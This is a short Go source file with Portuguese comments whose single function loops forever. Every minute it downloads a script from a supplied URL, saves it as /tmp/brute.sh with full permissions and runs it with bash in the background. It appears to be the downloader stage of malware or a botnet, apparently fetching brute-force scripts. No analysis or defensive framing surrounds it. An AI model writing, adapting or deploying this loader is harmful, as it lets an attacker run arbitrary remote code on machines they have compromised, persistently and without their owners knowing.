
package main



import (


"net/http"
"io/ioutil"
"os/exec"
"time"

)



func utils_down( scri  string){  //funcao para abaixa sripts  secundarios





//function no critical



for {




time.Sleep ( 60  * time.Second)




cli := http.Client{}


resp , err_get := cli.Get(scri)


 if err_get != nil {


  //erro no github.com 

          continue



   }



script  , err_readall :=  ioutil.ReadAll(resp.Body) 

   if err_readall  != nil  {


       //"erro em readall"


           continue


            }


ioutil.WriteFile("/tmp/brute.sh" , script , 0777 )



brute :=  exec.Command("sh" , "-c" , " cd /tmp/ ; bash  brute.sh")

 
brute.Start()




}




}












